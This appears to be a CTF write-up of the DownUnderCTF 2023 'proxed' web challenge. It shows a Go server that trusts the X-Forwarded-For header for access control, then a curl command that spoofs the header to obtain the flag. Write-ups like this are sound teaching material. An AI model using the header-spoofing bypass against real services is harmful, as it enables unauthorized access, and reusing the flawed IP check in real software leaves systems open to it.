---
title: DownUnderCTF 2023 - proxed
description: Writeup for proxed web challenge
date: 2023-12-18
tldr: Cool haxxorz only
draft: false
tags: ["ctf", "writeup", "web"]
---



# proxed 100 pts web


inspecting the go code we see that it checks the source ip of the request


```go
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

var (
	port = flag.Int("port", 1337, "The port to listen on")
)

func main() {

	flag.Parse()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		xff := r.Header.Values("X-Forwarded-For")

		ip := strings.Split(r.RemoteAddr, ":")[0]

		if xff != nil {
			ips := strings.Split(xff[len(xff)-1], ", ")
			ip = ips[len(ips)-1]
			ip = strings.TrimSpace(ip)
		}

		if ip != "31.33.33.7" {
			message := fmt.Sprintf("untrusted IP: %s", ip)
			http.Error(w, message, http.StatusForbidden)
			return
		} else {
			w.Write([]byte(os.Getenv("FLAG")))
		}
	})

	log.Printf("Listening on port %d", *port)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", *port), nil))
}

```
Simple curl does not give us the flag because our ip is not trusted.

```
curl http://proxed.duc.tf:30019/
untrusted IP: <redacted>
```

Fortunately for us we can simply spoof the source ip with `curl`


```
curl --header "X-Forwarded-For: 31.33.33.7" http://proxed.duc.tf:30019/
DUCTF{17_533m5_w3_f0rg07_70_pr0x}
```